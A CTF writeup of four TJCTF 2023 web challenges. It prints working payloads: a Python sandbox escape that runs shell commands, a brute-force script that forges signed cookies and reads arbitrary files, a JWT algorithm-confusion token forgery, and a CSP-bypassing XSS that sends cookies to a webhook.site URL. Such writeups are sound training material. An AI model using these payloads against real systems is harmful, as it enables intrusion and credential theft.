---
title:  "TJCTF 2023 — 4x Web Challenges Writeup"
description: "Writeup for outdated, pay-to-win, back-to-the-past and yolo web challenges on the TJCTF 2023."
categories: ['Writeup']
tags: ['CTF']
permalink: tjctf-2023-web-challenges-writeup
read_time: 14
date: 2023-06-08 00:20 +0200
image:
  path: /assets/img/cards/tjctf-2023-web-challenges-writeup.png
---
**TJCTF 2023** is a cybersecurity CTF competition hosted by TJCSC, held online over the weekend of May 26-28. There were 39 challenges over 6 categories — **crypto**, **forensics**, **misc**, **pwn**, **rev** and **web**.

I participated as a member of the team [**CyberHero**](https://ctftime.org/team/130070/){:target="_blank"}. We solved 25/39 challenges, and out of ~1000 teams, we placed **27th**. 🎉

One challenge remained unsolved, and some were solved by my teammates. In this writeup I will go through the ones that I have solved:
- [outdated](#outdated)
- [pay-to-win](#pay-to-win)
- [back-to-the-past](#back-to-the-past)
- [yolo](#yolo)


# outdated

> I found this old website that runs your python code, but the security hasn't been updated in years
> 
> I'm sure there's a flag floating around, can you find it?
> 
> 🐳 *Instancer* 
> 
> 📦 *server.zip*

By looking at the file structure I could tell it's a Flask app.

![](/uploads/{{ page.permalink }}/ss1.png)

After glancing over the code it became apparent that the purpose of the app is to execute user submitted Python code.

Let's go through the content of `app.py`. The initial sections of the code include typical Flask imports, configurations, and endpoints for rendering templates. Let's scroll down to explore further.

```python
from flask import Flask, request, render_template, redirect
from ast import parse
import re
import subprocess
import uuid

app = Flask(__name__)
app.static_folder = 'static'
app.config['UPLOAD_FOLDER'] = './uploads'

@app.route('/')
def index():
    return render_template('home.html')

@app.route('/upload')
def upload():
    return render_template('index.html')
```

The following `/submit` endpoint is used for uploading Python scripts that you wish to execute. It saves the code at `uploads/<uuid>.py`, performs some checks, and then executes the script using a subprocess.

```python
@app.route('/submit', methods=['GET', 'POST'])
def submit():
    if 'file' not in request.files:
        return redirect('/')
    f = request.files['file']
    fname = f"uploads/{uuid.uuid4()}.py"
    f.save(fname)
    code_to_test = re.sub(r'\\\s*\n\s*', '', open(fname).read().strip())
    if not code_to_test:
        return redirect('/')
    tested = test_code(code_to_test)
    if tested[0]:
        res = ''
        try:
            ps = subprocess.run(['python', fname], timeout=5, capture_output=True, text=True)
            res = ps.stdout
        except:
            res = 'code timout'
        return render_template('submit.html', code=code_to_test.split('\n'), text=res.strip().split('\n'))
    else:
        return render_template('submit.html', code=code_to_test.split('\n'), text=[tested[1]])
```

An endpoint for serving static files, nothing interesting there.

```py
@app.route('/static/<path:path>')
def static_file(filename):
    return app.send_static_file(filename)
```

The following methods look like defense mechanisms to mitigate the risk of users uploading malicious Python code. Let's examine each of these measures.

**1.** Non-ascii characters are not allowed.

```py
def test_for_non_ascii(code):
    return any(not (0 < ord(c) < 127) for c in code)
```

**2.** `import` keyword is not allowed. Maybe I could use `__import__` instead?

```py
def test_for_imports(code):
    cleaned = clean_comments_and_strings(code)
    return 'import ' in cleaned
```

**3.** Code has to be shorter than 1000 characters and it must successfully pass the parsing process using `ast.parse`.

```py
def test_for_invalid(code):
    if len(code) > 1000:
        return True
    try:
        parse(code)
    except:
        return True
    return False
```

**4.** Certain keywords, such as `__import__`, along with several others, are restricted. This resembles a typical *PyJail* challenge, where the goal is to find a way to bypass these restrictions.

```py
blocked = ["__import__", "globals", "locals", "__builtins__", "dir", "eval", "exec",
        "breakpoint", "callable", "classmethod", "compile", "staticmethod", "sys",
        "__importlib__", "delattr", "getattr", "setattr", "hasattr", "sys", "open"]

blocked_regex = re.compile(fr'({"|".join(blocked)})(?![a-zA-Z0-9_])')

def test_for_disallowed(code):
    code = clean_comments_and_strings(code)
    return blocked_regex.search(code) is not None

def test_code(code):
    if test_for_non_ascii(code):
        return (False, 'found a non-ascii character')
    elif test_for_invalid(code):
        return (False, 'code too long or not parseable')
    elif test_for_imports(code):
        return (False, 'found an import')
    elif test_for_disallowed(code):
        return (False, 'found an invalid keyword')
    return (True, '')
```

Comments and strings are removed from the code upon checking to eliminate false positives regarding restricted keywords.

```py
def clean_comments_and_strings(code):
    code = re.sub(r'[rfb]*("""|\'\'\').*?\1', '', code,
                  flags=re.S)
    lines, res = code.split('\n'), ''
    for line in lines:
        line = re.sub(r'[rfb]*("|\')(.*?(?!\\).)?\1',
                      '', line)
        if '#' in line:
            line = line.split('#')[0]
        if not re.fullmatch(r'\s*', line):
          res += line + '\n'
    return res.strip()

if __name__ == '__main__':
    app.run(debug=True)
```

To determine the method which we can use to retrieve the flag, I searched for "flag" within the challenge directory. Inside `run.sh` file, which serves as the entrypoint script, we can see that the flag's filename is randomized. This indicates that reading the flag may require getting remote code execution (RCE) first.

```sh
#!/bin/bash

mkdir uploads && mv flag.txt flag-$(cat /proc/sys/kernel/random/uuid).txt
exec gunicorn -b 0.0.0.0:5000 -w 4 app:app
```

To gain a better understanding of the application's behavior and explore its functionalities, I ran it locally.

```sh
docker build -t outdated . && \
docker run --rm -p 5000:5000 -t outdated
```

On the home page, there is a single navigation link labeled "Upload."

![](/uploads/{{ page.permalink }}/ss2.png)

Upload page has the following form:

![](/uploads/{{ page.permalink }}/ss3.png)

After uploading and submitting my Python code, both my code and the output were printed on the page.

![](/uploads/{{ page.permalink }}/ss4.png)

I intercepted the request using Burp Suite and sent it to the repeater. At this point I was ready to start trying things out.

![](/uploads/{{ page.permalink }}/ss5.png)

So far we've seen that it's not possible to use `import` nor `__import__`. Strings are ignored when checking, but `eval`, `exec` and `compile` are also blocked. Non-ascii characters are also blocked, so we cannot bypass those word checks.

The first thing that came to my mind is the type of payloads used in challenges involving Python, Jinja and exploiting SSTI vulnerabilities, such as this one:

```python
# The class 396 is the class <class 'subprocess.Popen'>
''.__class__.__mro__[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()
```

I recommend reading [this note from HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#recovering-less-than-class-object-greater-than) to learn more about recovering the `<class 'object'>` class and accessing all the other classes from the Python env.

I figured that I probably don't need any of the blocked words for this type of payload, so I started crafting it. The first step is to see the list of the available classes. Let's go step by step.

```py
print('')

''
```
```py
print(''.__class__)

<class 'str'>
```
```py
print(''.__class__.__mro__)

(<class 'str'>, <class 'object'>)
```
```py
print(''.__class__.__mro__[1])

<class 'object'>
```
```py
print(''.__class__.__mro__[1].__subclasses__())

[<class 'type'>,
<class 'weakref'>,
<class 'weakcallableproxy'>,
<class 'weakproxy'>,
<class 'int'>,
<class 'bytearray'>,
<class 'bytes'>,
<class 'list'>,
<class 'NoneType'>,
<class 'NotImplementedType'>,
<class 'traceback'>,
<class 'super'>,
<class 'range'>,
<class 'dict'>,
<class 'dict_keys'>,
<class 'dict_values'>,
<class 'dict_items'>,
<class 'dict_reversekeyiterator'>,
<class 'dict_reversevalueiterator'>,
<class 'dict_reverseitemiterator'>,
<class 'odict_iterator'>,
<class 'set'>,
<class 'str'>,
<class 'slice'>,
<class 'staticmethod'>,
<class 'complex'>,
<class 'float'>,
<class 'frozenset'>,
<class 'property'>,
<class 'managedbuffer'>,
<class 'memoryview'>,
<class 'tuple'>,
<class 'enumerate'>,
<class 'reversed'>,
<class 'stderrprinter'>,
<class 'code'>,
<class 'frame'>,
<class 'builtin_function_or_method'>,
<class 'method'>,
<class 'function'>,
<class 'mappingproxy'>,
<class 'generator'>,
<class 'getset_descriptor'>,
<class 'wrapper_descriptor'>,
<class 'method-wrapper'>,
<class 'ellipsis'>,
<class 'member_descriptor'>,
<class 'types.SimpleNamespace'>,
<class 'PyCapsule'>,
<class 'longrange_iterator'>,
<class 'cell'>,
<class 'instancemethod'>,
<class 'classmethod_descriptor'>,
<class 'method_descriptor'>,
<class 'callable_iterator'>,
<class 'iterator'>,
<class 'pickle.PickleBuffer'>,
<class 'coroutine'>,
<class 'coroutine_wrapper'>,
<class 'InterpreterID'>,
<class 'EncodingMap'>,
<class 'fieldnameiterator'>,
<class 'formatteriterator'>,
<class 'BaseException'>,
<class 'hamt'>,
<class 'hamt_array_node'>,
<class 'hamt_bitmap_node'>,
<class 'hamt_collision_node'>,
<class 'keys'>,
<class 'values'>,
<class 'items'>,
<class 'Context'>,
<class 'ContextVar'>,
<class 'Token'>,
<class 'Token.MISSING'>,
<class 'moduledef'>,
<class 'module'>,
<class 'filter'>,
<class 'map'>,
<class 'zip'>,
<class '_frozen_importlib._ModuleLock'>,
<class '_frozen_importlib._DummyModuleLock'>,
<class '_frozen_importlib._ModuleLockManager'>,
<class '_frozen_importlib.ModuleSpec'>,
<class '_frozen_importlib.BuiltinImporter'>,
<class 'classmethod'>,
<class '_frozen_importlib.FrozenImporter'>,
<class '_frozen_importlib._ImportLockContext'>,
<class '_thread._localdummy'>,
<class '_thread._local'>,
<class '_thread.lock'>,
<class '_thread.RLock'>,
<class '_frozen_importlib_external.WindowsRegistryFinder'>,
<class '_frozen_importlib_external._LoaderBasics'>,
<class '_frozen_importlib_external.FileLoader'>,
<class '_frozen_importlib_external._NamespacePath'>,
<class '_frozen_importlib_external._NamespaceLoader'>,
<class '_frozen_importlib_external.PathFinder'>,
<class '_frozen_importlib_external.FileFinder'>,
<class '_io._IOBase'>,
<class '_io._BytesIOBuffer'>,
<class '_io.IncrementalNewlineDecoder'>,
<class 'posix.ScandirIterator'>,
<class 'posix.DirEntry'>,
<class 'zipimport.zipimporter'>,
<class 'zipimport._ZipImportResourceReader'>,
<class 'codecs.Codec'>,
<class 'codecs.IncrementalEncoder'>,
<class 'codecs.IncrementalDecoder'>,
<class 'codecs.StreamReaderWriter'>,
<class 'codecs.StreamRecoder'>,
<class '_abc_data'>,
<class 'abc.ABC'>,
<class 'dict_itemiterator'>,
<class 'collections.abc.Hashable'>,
<class 'collections.abc.Awaitable'>,
<class 'collections.abc.AsyncIterable'>,
<class 'async_generator'>,
<class 'collections.abc.Iterable'>,
<class 'bytes_iterator'>,
<class 'bytearray_iterator'>,
<class 'dict_keyiterator'>,
<class 'dict_valueiterator'>,
<class 'list_iterator'>,
<class 'list_reverseiterator'>,
<class 'range_iterator'>,
<class 'set_iterator'>,
<class 'str_iterator'>,
<class 'tuple_iterator'>,
<class 'collections.abc.Sized'>,
<class 'collections.abc.Container'>,
<class 'collections.abc.Callable'>,
<class 'os._wrap_close'>,
<class '_sitebuiltins.Quitter'>,
<class '_sitebuiltins._Printer'>,
<class '_sitebuiltins._Helper'>]
```

After obtaining the list of all the classes, I proceeded to search for the common classes that can be leveraged to achieve RCE, such as `<class 'subprocess.Popen'>`. While many of the common classes aren't there, luckily there is `<class 'os._wrap_close'>` that can be used. It's fourth from the end in our list, so we can access it by the index `-4`.

```py
print(''.__class__.__mro__[1].__subclasses__()[-4])

<class 'os._wrap_close'>
```

To run a shell command, we can access the `__init__` method's global namespace (`__globals__` attribute) and retrieve the `system` function, which is our goal function that can be used to run shell commands.

The final payload looks like this:

```py
print(''.__class__.__mro__[1].__subclasses__()[-4].__init__.__globals__['system']('ls -la'))
```

RCE is there. 🥳

![](/uploads/{{ page.permalink }}/ss6.png)

The last step is to run `cat flag*` and that will print the flag:

```py
print(''.__class__.__mro__[1].__subclasses__()[-4].__init__.__globals__['system']('cat flag*'))
```

# pay-to-win

> This service is wayyyyy to expensive. I can't afford that! I did hear that premium users get a flag though...
>
> 🌐 [pay-to-win.tjc.tf](https://pay-to-win.tjc.tf/){:target="_blank"}
>
> 📦 *server.zip*

In this challenge we have another Flask app.

![](/uploads/{{ page.permalink }}/ss7.png)

I searched for the flag and found out that it's always inside `/secret-flag-dir/flag.txt`.

```dockerfile
FROM python:3.8.5-slim-buster

RUN pip install flask gunicorn pyjwt[crypto]
COPY . /app
RUN mkdir /secret-flag-dir; mv /app/flag.txt /secret-flag-dir/flag.txt
WORKDIR /app

EXPOSE 5000

CMD ["gunicorn", "-b", "0.0.0.0:5000", "app:app", "-t", "4"]
```

This may indicate that an LFI (local file inclusion) vulnerability could be enough to retrieve the flag, since we have already determined the flag's exact filename and path.

I will start by showing the whole code of `app.py`, and go back at the interesting parts.

```py
from flask import Flask, request, render_template, redirect, make_response
from base64 import b64encode, b64decode
import hashlib
import random
import json

app = Flask(__name__)
users = {}


def hash(data):
    return hashlib.sha256(bytes(data, 'utf-8')).hexdigest()


@app.route('/')
def index():
    if request.cookies.get('data') is None or request.cookies.get('hash') is None:
        return redirect('/login')

    data = request.cookies.get('data')
    decoded = b64decode(data)
    data_hash = request.cookies.get('hash')
    payload = json.loads(decoded)

    if payload['username'] not in users:
        resp = make_response(redirect('/login'))
        resp.set_cookie('data', '', expires=0)
        resp.set_cookie('hash', '', expires=0)
        return resp

    actual_hash = hash(data + users[payload['username']])

    if data_hash != actual_hash:
        return redirect('/login')

    if payload['user_type'] == 'premium':
        theme_name = request.args.get('theme') or 'static/premium.css'
        return render_template('premium.jinja', theme_to_use=open(theme_name).read())
    else:
        return render_template('basic.jinja')


@app.route('/login', methods=['GET'])
def get_login():
    return render_template('login.jinja')


@app.route('/login', methods=['POST'])
def post_login():
    username = request.form['username']

    if username not in users:
        users[username] = hex(random.getrandbits(24))[2:]

    resp = make_response(redirect('/'))
    data = {
        "username": username,
        "user_type": "basic"
    }

    b64data = b64encode(json.dumps(data).encode())
    data_hash = hash(b64data.decode() + users[username])
    resp.set_cookie('data', b64data)
    resp.set_cookie('hash', data_hash)
    return resp


if __name__ == '__main__':
    app.run()
```

The first part that sticks out is the way the app handles the `user_type` field in a cookie.

```python
@app.route('/')
def index():
    # ...
    data = request.cookies.get('data')
    decoded = b64decode(data)
    data_hash = request.cookies.get('hash')
    payload = json.loads(decoded)
    # ...
    if payload['user_type'] == 'premium':
        theme_name = request.args.get('theme') or 'static/premium.css'
        return render_template('premium.jinja', theme_to_use=open(theme_name).read())
    else:
        return render_template('basic.jinja')
```

If we could modify the `user_type` field and set it to `premium`, along with passing the `theme` query parameter, we could make the app read and output the content of any file when rendering `premium.jinja` template:

```html
<!DOCTYPE html>
<html lang="en">
<style> {% raw %}{{ theme_to_use }}{% endraw %} </style> <!-- <= flag goes here -->
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cool Premium Users Only</title>
</head>
<body>
  <p class="title">Welcome to the premium site!<p>
  <p>You can now use themes! Try one of these themes below:</p>
  <a href='/?theme=static/premium.css'>default</a>  <a href='/?theme=static/light_mode.css'>light mode</a>  <a href='/?theme=static/garish.css'>garish</a>
  <p>Due to supply chain issues, we cannot provide you with a flag... Sorry, and thanks for supporting this site!</p>
</body>
</html>
```

The cookie is signed with some random value that is unique for each user, so we cannot modify it straight away.

```python
app = Flask(__name__)
users = {}

def hash(data):
    return hashlib.sha256(bytes(data, 'utf-8')).hexdigest()

@app.route('/')
def index():
    # ...
    data_hash = request.cookies.get('hash')
    # ...
    actual_hash = hash(data + users[payload['username']])

    if data_hash != actual_hash:
        return redirect('/login')
    # ...
```

In the login route we can see how that random value is generated, and more importantly, its **length**.

```python
@app.route('/login', methods=['POST'])
def post_login():
    username = request.form['username']

    if username not in users:
        users[username] = hex(random.getrandbits(24))[2:]

    resp = make_response(redirect('/'))
    data = {
        "username": username,
        "user_type": "basic"
    }

    b64data = b64encode(json.dumps(data).encode())
    data_hash = hash(b64data.decode() + users[username])
    resp.set_cookie('data', b64data)
    resp.set_cookie('hash', data_hash)
    return resp
```

We can see that the secrets are only **24 bits** (3 bytes) long. To crack a 24-bit key, you need to make no more than **16,777,216** attempts (2^24). So let's get into it.

First I needed to obtain a real cookie and hash, which I did through the application itself. I logged in and got a new cookie pair.

![](/uploads/{{ page.permalink }}/ss8.png)

![](/uploads/{{ page.permalink }}/ss9.png)

Then I borrowed the code for hashing and checking hashes from the app, so I can bruteforce the key.

```python
from base64 import b64encode
import hashlib
import json

data = 'eyJ1c2VybmFtZSI6ICJzNG5kdSIsICJ1c2VyX3R5cGUiOiAiYmFzaWMifQ=='
data_hash = '2fd7928b6db667c471a7ed6cd23aa6d76ee8fa9b5b0a7b1aeb511328ba631031'

def hash(data):
    return hashlib.sha256(bytes(data, 'utf-8')).hexdigest()

def check(key):
    actual_hash = hash(data + hex(key)[2:])
    return data_hash == actual_hash

# Step 1. Crack the key
for i in range(2 ** 24):
    if check(i):
        print('key', i)
        key = hex(i)[2:]
        break

# Step 2. Use the key to forge a signature
data = {
    'username': 's4ndu',
    'user_type': 'premium'
}

b64data = b64encode(json.dumps(data).encode()).decode()
data_hash = hash(b64data + key)
print('data', b64data)
print('hash', data_hash)
```

Within a few seconds of attempting different combinations, I successfully cracked the key. Using the key, I proceeded to generate my own cookie pair.

```
key 7497015
data eyJ1c2VybmFtZSI6ICJzNG5kdSIsICJ1c2VyX3R5cGUiOiAicHJlbWl1bSJ9
hash bbd8c4d4bad38f89c84d50ead4e22dff9cc4c9c22011719b7c0e53e4f098aadf
```

First I updated the cookies.

![](/uploads/{{ page.permalink }}/ss10.png)

Then I passed `/secret-flag-dir/flag.txt` as a value of the `theme` query parameter.

![](/uploads/{{ page.permalink }}/ss11.png)

CSS was gone, but the flag was there:

![](/uploads/{{ page.permalink }}/ss12.png)

# back-to-the-past

> "Back to the Future" never made sense as a title 
> 
> 🌐 [back-to-the-future.tjc.tf](https://back-to-the-future.tjc.tf/){:target="_blank"}
>
> 📦 *server.zip*
>

Another Flask app, but this time with some more files besides `app.py`.

![](/uploads/{{ page.permalink }}/ss13.png)

Since there was more code this time, I decided to start by using the app to see how it behaves. The only thing I searched for was the flag to see how is it stored or used, and I found it in `app.py`:

```python
flag = open("flag.txt", "r").read()
# ...
@app.route("/retro")
@login_required()
def retro(user):
    if int(user["year"]) > 1970:
        return render_template("retro.html", flag="you aren't *retro* enough")
    else:
        return render_template("retro.html", flag=flag)
```

Looks like the goal is to login as an user that has the value of the "year" field less than 1970.

There are login and register pages.

![](/uploads/{{ page.permalink }}/ss14.png)

![](/uploads/{{ page.permalink }}/ss15.png)

I registered with my username and my birth year.

![](/uploads/{{ page.permalink }}/ss16.png)

Huh, didn't know that "s4ndu" sounds kinda old.

I refreshed the page and the same message was still there, which means that I am still ~~old~~ logged in. I checked cookies to see if anything has been set.

There was a cookie called "token", which contained the following header and body:
```json
{
  "typ": "JWT",
  "alg": "RS256"
}
```
```json
{
  "id": "51027d09-96bc-466a-be78-e5d7e937562d",
  "username": "s4ndu",
  "year": "2000"
}
```

We can see that it's a JWT token signed using RSA with SHA-256 as the hashing algorithm (`alg: RS256`). The token is signed using asymmetric encryption, which means that it requires a private key for signing and a corresponding public key for verification. This may be useful since we have `public_key.pem` file in the static folder, and it can be downloaded from `/static/public_key.pem`.

I looked into the code to see how JWT tokens are handled. The first thing that caught my attention was this:

```py
import jwt # This is a module "jwt.py", not a library
# ...
private_key = open("private.key", "rb").read()
public_key = open("static/public_key.pem", "rb").read()

def generate_token(id, username, year):
    return jwt.encode(
        {"id": id, "username": username, "year": year}, private_key, algorithm="RS256"
    )

def verify_token(token):
    try:
        return jwt.decode(token.encode(), public_key, algorithms=["HS256", "RS256"])
    except:
        return None
```

In the application, RS256 is always used when generating tokens, but both RS256 and HS256 are supported for verification. The main difference between these two algorithms is their encryption approach. RS256 relies on RSA, an encryption algorithm that uses different keys for signing and verification (**asymmetric** keys), while HS256 utilizes HMAC, which uses a shared secret key for both signing and verification (**symmetric** key).

It is totally possible to securely incorporate multiple algorithms into an application. However, improper implementation or usage of JWT libraries can lead to [Algorithm Confusion](https://portswigger.net/web-security/jwt/algorithm-confusion){:target="_blank"} vulnerabilities.

Without diving too deep into the code, in this implementation (`jwt.py`) there is this this check in the `decode` function:

```py
# ...
alg_to_use = json_header["alg"]
if alg_to_use == "HS256":
    h = hmac.HMAC(secret, hashes.SHA256())
    h.update(b".".join([header, payload]))
    h.verify(decoded_signature)
elif alg_to_use == "RS256":
    pub = serialization.load_pem_public_key(secret)
    pub.verify(
# ...
```

For both algorithms, the private/public key is being read from the same varaible `secret`, which is actually `public_key.pem` file that we can download.

That means, if we changed the `alg` to `HS256`, the token's secret key would be that public key.

First I downloaded the public key into the server folder:
```sh
cd server
wget https://back-to-the-future.tjc.tf/static/public_key.pem
```

Then I ran Python REPL, imported everything from `jwt.py` and loaded the public key.
```python
>>> from jwt import *
>>> public_key = open("public_key.pem", "rb").read()
```

After that, I called `encode` to generate myself a custom token with the year set to <1970.

```python
>>> encode({
...     "id": "51027d09-96bc-466a-be78-e5d7e937562d",
...     "username": "s4ndu",
...     "year": "1969"
... }, public_key, algorithm="HS256")
b'eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiJ9.eyJpZCI6ICI1MTAyN2QwOS05NmJjLTQ2NmEtYmU3OC1lNWQ3ZTkzNzU2MmQiLCAidXNlcm5hbWUiOiAiczRuZHUiLCAieWVhciI6ICIxOTY5In0.bxPM6DMT1oytXL06w02P_Hxb-cTmVcwtSpnofmSm6Uk'
```

I swapped the old cookie for the new one in my browser, refreshed the page and the message had changed (not for the better).

![](/uploads/{{ page.permalink }}/ss18.png)

Anyway, our flag should be at `/retro`.

![](/uploads/{{ page.permalink }}/ss19.png)

There is our flag, fellow kids.

# yolo

> I found this website that makes me really emotional because it's so motivational...
> 
> 🌐 [yolo.tjc.tf](https://yolo.tjc.tf/){:target="_blank"}
>
> 🤖 [Admin Bot](https://admin-bot.tjctf.org/yolo){:target="_blank"}
>
> 📦 *server.zip*
> 
> 📄 *admin-bot.js*
> 

This application is written in Node, and the challenge also includes a script called `admin-bot.js` that simulates a user. When a user is being simulated in a CTF, it is most likely necessary to carry out attacks on the frontend app running in the user's browser. Most commonly, that is XSS (cross-site scripting).

![](/uploads/{{ page.permalink }}/ss20.png)

Here is the code of the admin bot:

```js
import flag from './flag.txt';

function sleep(time) {
    return new Promise(resolve => {
        setTimeout(resolve, time);
    });
}

export default {
    id: 'yolo',
    name: 'yolo',
    urlRegex: /^https:\/\/yolo\.tjc\.tf\//,
    timeout: 10000,
    handler: async (url, ctx) => {
        const page = await ctx.newPage();
        await page.goto('https://yolo.tjc.tf', { waitUntil: 'domcontentloaded' });

        await sleep(1000);

        await page.type('#name', 'admin');
        await page.type('#toDo', flag.trim());

        await page.click('#submit');

        await sleep(500);

        await page.goto(url, { timeout: 3000, waitUntil: 'domcontentloaded' });
        await sleep(3000);
    }
};
```

Admin will submit the flag somewhere and navigate to a URL that we provided. To execute these bot actions, the URL needs to be submitted through a form and it must begin with `https://yolo.tjc.tf/`.

![](/uploads/{{ page.permalink }}/ss21.png)

I started using the app to see how it behaves. On the home page there was this simple form.

![](/uploads/{{ page.permalink }}/ss22.png)

As I stumbled upon this form, a wave of existential crisis washed over me, questioning the life choices that led to writing writeups on a Friday evening. But hey, here I am, preparing for ECSC 2023, because there's nothing quite like the thrill of hacking in a hall filled with over 300 other hackers from across the Europe, and the joy of the celebrations that follow aftewards. 🍻 It does make life a bit more fun, doesn't it?

I filled the form with "s4ndu" and "solve this", and my input was reflected back to me.

![](/uploads/{{ page.permalink }}/ss23.png)

Also I got a shareable link that shows the same message.

Since the input is persisted and displayed at some URL afterwards, I figured that I was likely supposed to perform a [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored){:target="_blank"} type of an XSS attack.

I tried with the classic `<script>alert(1)</script>` to see what happens in my browser first.

![](/uploads/{{ page.permalink }}/ss24.png)

Content Security Policy comes to the rescue and no JavaScript was executed.

![](/uploads/{{ page.permalink }}/ss25.png)

Before looking at what this CSP is about, I also noticed that the shareable URL is the same for every message that I submit. It's determined by the `userId` field in the JWT token.
```json
{
  "iat": 1685734914,
  "nonce": "f11b2a3992cf1d132640d03fbeced09dd4691108de4d21aebf75dd0072726da0",
  "userId": "f7c36031-7f20-4718-b45d-ccfd44f17274"
}
```
Since our bot submits the flag, we need to get its userId and read the flag at `/do/<userId>`.

Now that we know what our goal is, let's see what is trying to prevent us from doing that.
```js
app.decorateRequest('locals', null);
app.addHook('onRequest', (req, res, next) => {
    if (!req.cookies.token) {
        req.locals = {};
        return next();
    }

    try {
        req.locals = jwt.verify(req.cookies.token, secret);
    } catch (err) {
        req.locals = {};
    }

    req.locals.nonce = req.locals.nonce ?? '47baeefe8a0b0e8276c2f7ea2f24c1cc9deb613a8b9c866f796a892ef9f8e65d';
    req.locals.nonce = crypto.createHash('sha256').update(req.locals.nonce).digest('hex');
    res.header('Content-Security-Policy', `script-src 'nonce-${req.locals.nonce}'; default-src 'self'; style-src 'self' 'nonce-${req.locals.nonce}';`);

    req.locals.userId ??= v4();

    next();
});

app.addHook('preHandler', (req, res, next) => {
    res.cookie('token', jwt.sign(req.locals, secret), {
        path: '/',
    });

    next();
});
```

Looking at the CSP header we can see that this policy requires a nonce for using the script tags. The nonce is calculated based on the previous nonce that is stored in a JWT token in a cookie. If there is no cookie present, an initial value `47baeefe8a0b0...` is used.

Let's see it in action.

I opened the page in an incognito window (to get rid of the cookies), and looked at the page source.

At first, the nonce was an empty string.

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>you only live once.</title>

    <style nonce="">
        #main {
            width: 100%;
```

Upon repeatedly refreshing the page, the values of the nonces changed each time.

```html
<style nonce="f8c5a82d13fc3dd49597d4d292ab08f98c3a7845eb7268213ec6a0168fe3ce11">
```

Some of the nonces were:
```
f8c5a82d13fc3dd49597d4d292ab08f98c3a7845eb7268213ec6a0168fe3ce11
6cfa460c34d3b448767eb47edb9a73d03061e913cd8a7d712340ccdf8b342c36
6945898b2417e648bbd2ee586f1decc94017cb7ccac9230f443a8a9b63bbea86
322fe65fc25573af2aa1131d31f19b5faf50a85f94e7495b82772c969e06b9b5
...
```

Since the initial value of the nonce is hardcoded and remains constant, and each subsequent nonce is generated based on the previous one, one would expect the nonces to be the same every time the app is opened in a fresh browser session.

I tried it and yes, that is exactly what happens each time. Our admin bot also opens the app in a fresh browser session, so let's predict the nonce and bypass CSP.

I borrowed the code for generating nonces and used it to generate the first 10 nonces.

```js
const crypto = require('crypto');

let nonce = '47baeefe8a0b0e8276c2f7ea2f24c1cc9deb613a8b9c866f796a892ef9f8e65d'

for (let i = 0; i < 10; i++) {
    nonce = crypto.createHash('sha256').update(nonce).digest('hex');
    console.log(nonce);
}
```

```
$ node generate.js
34dce4583c235ebfa8e06020ae7f81ccc0007b05baf6cca9c03ae07930c64b4f
f8c5a82d13fc3dd49597d4d292ab08f98c3a7845eb7268213ec6a0168fe3ce11
6cfa460c34d3b448767eb47edb9a73d03061e913cd8a7d712340ccdf8b342c36
6945898b2417e648bbd2ee586f1decc94017cb7ccac9230f443a8a9b63bbea86
322fe65fc25573af2aa1131d31f19b5faf50a85f94e7495b82772c969e06b9b5
03048a02e9aa1e1988dfe3b87ddd814abb2e461804055fa54137dd43bcf4b065
76fd489cba8add7424ef86c2a26e641d995c0e29c01871337386555d9d7f90f3
4fe17b3eab8571d602f3c0452033cf713dab845a34b2cd573f23db05033344c7
93af138c9d0fb8ad1c4ce6ea446bc0ab0f676ac7d823c00d4f2d6dbd42b645c7
e6a9d7a1c434b1deaab123b2eed806c4a319e832ba933b2a1135ff99b33d6aef
```

To determine which nonce we really need, we could count the requests our bot makes. For example, if it made a total of 3 requests after it navigated to our page, the fourth nonce is the one that should be able to bypass the CSP.

But I got lazy and my payload was this. 👍

```html
<script nonce="34dce4583c235ebfa8e06020ae7f81ccc0007b05baf6cca9c03ae07930c64b4f">
    location.replace("https://webhook.site/551d81d6-5ef8-4d06-8ebb-bb98d3ba584e/?cookie=" + document.cookie)
</script>
<script nonce="f8c5a82d13fc3dd49597d4d292ab08f98c3a7845eb7268213ec6a0168fe3ce11">
    location.replace("https://webhook.site/551d81d6-5ef8-4d06-8ebb-bb98d3ba584e/?cookie=" + document.cookie)
</script>
<script nonce="6cfa460c34d3b448767eb47edb9a73d03061e913cd8a7d712340ccdf8b342c36">
    location.replace("https://webhook.site/551d81d6-5ef8-4d06-8ebb-bb98d3ba584e/?cookie=" + document.cookie)
</script>
<script nonce="6945898b2417e648bbd2ee586f1decc94017cb7ccac9230f443a8a9b63bbea86">
    location.replace("https://webhook.site/551d81d6-5ef8-4d06-8ebb-bb98d3ba584e/?cookie=" + document.cookie)
</script>
<script nonce="322fe65fc25573af2aa1131d31f19b5faf50a85f94e7495b82772c969e06b9b5">
    location.replace("https://webhook.site/551d81d6-5ef8-4d06-8ebb-bb98d3ba584e/?cookie=" + document.cookie)
</script>
<script nonce="03048a02e9aa1e1988dfe3b87ddd814abb2e461804055fa54137dd43bcf4b065">
    location.replace("https://webhook.site/551d81d6-5ef8-4d06-8ebb-bb98d3ba584e/?cookie=" + document.cookie)
</script>
<script nonce="76fd489cba8add7424ef86c2a26e641d995c0e29c01871337386555d9d7f90f3">
    location.replace("https://webhook.site/551d81d6-5ef8-4d06-8ebb-bb98d3ba584e/?cookie=" + document.cookie)
</script>
<script nonce="4fe17b3eab8571d602f3c0452033cf713dab845a34b2cd573f23db05033344c7">
    location.replace("https://webhook.site/551d81d6-5ef8-4d06-8ebb-bb98d3ba584e/?cookie=" + document.cookie)
</script>
<script nonce="93af138c9d0fb8ad1c4ce6ea446bc0ab0f676ac7d823c00d4f2d6dbd42b645c7">
    location.replace("https://webhook.site/551d81d6-5ef8-4d06-8ebb-bb98d3ba584e/?cookie=" + document.cookie)
</script>
<script nonce="e6a9d7a1c434b1deaab123b2eed806c4a319e832ba933b2a1135ff99b33d6aef">
    location.replace("https://webhook.site/551d81d6-5ef8-4d06-8ebb-bb98d3ba584e/?cookie=" + document.cookie)
</script>
```

